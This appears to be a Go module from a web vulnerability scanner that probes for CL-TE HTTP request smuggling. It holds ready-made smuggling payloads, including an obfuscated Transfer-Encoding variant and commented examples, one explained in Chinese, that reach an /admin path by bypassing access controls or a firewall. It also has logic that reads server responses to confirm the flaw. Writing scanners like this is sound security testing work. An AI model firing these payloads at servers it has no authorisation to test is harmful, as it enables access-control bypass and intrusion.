package Smuggling

import (
	"strings"
)

/*
Exploit
跳过权限控制，或者防火墙拦截，走私访问admin
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: x

*/
//  1 CL-TE
//  2 CL-TE-TE HTTP request smuggling, obfuscating the TE header
var ClTePayload = []string{`POST %s HTTP/1.1
Host: %s
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded%s
Content-Length: 6
Transfer-Encoding: chunked

0

G`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Content-length: 4
Connection: Keep-Alive
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

`, `POST %s HTTP/1.1
Host: %s
Content-Type: application/x-www-form-urlencoded%s
Connection: Keep-Alive
Content-Length: 62
Transfer-Encoding: chunked

16
login=xxx&password=xxx
0

GET /404 HTTP/1.1
X-Foo: bar`}

//, `POST %s HTTP/1.1
//Host: %s
//Content-Type: application/x-www-form-urlencoded%s
//Content-Length: 49
//Transfer-Encoding: chunked
//
//e
//q=smuggling&x=
//0
//
//GET /404 HTTP/1.1
//Foo: x`, `POST %s HTTP/1.1
//Host: %s
//Content-Type: application/x-www-form-urlencoded%s
//Content-Length: 116
//Transfer-Encoding: chunked
//
//0
//
//GET /admin HTTP/1.1
//Host: localhost
//Content-Type: application/x-www-form-urlencoded
//Content-Length: 10
//
//x=`

func init() {
	for n, x := range ClTePayload {
		x = E2EC(x)
		ClTePayload[n] = x
	}
}

type ClTe struct {
	Base
}

func NewCLTE() *ClTe {
	x := &ClTe{}
	x.Type = "CL-TE"
	x.Payload = ClTePayload
	return x
}

// 第三个payload 返回404表示ok
func (r *ClTe) CheckResponse(body string, payload string) bool {
	if payload == ClTePayload[2] {
		a := strings.Split(body, "HTTP/1.1 404")
		if 2 <= len(a) && (-1 < strings.Index(a[0], "HTTP/1.1 404") || -1 < strings.Index(a[0], "HTTP/1.1 200")) {
			return true
		}
	} else {
		return -1 < strings.Index("Unrecognized method GPOST", body) //|| -1 < strings.Index("HTTP/1.1 404 Not Found", body)
	}
	return false
}

func (r *ClTe) GetTimes() int {
	return 2
}
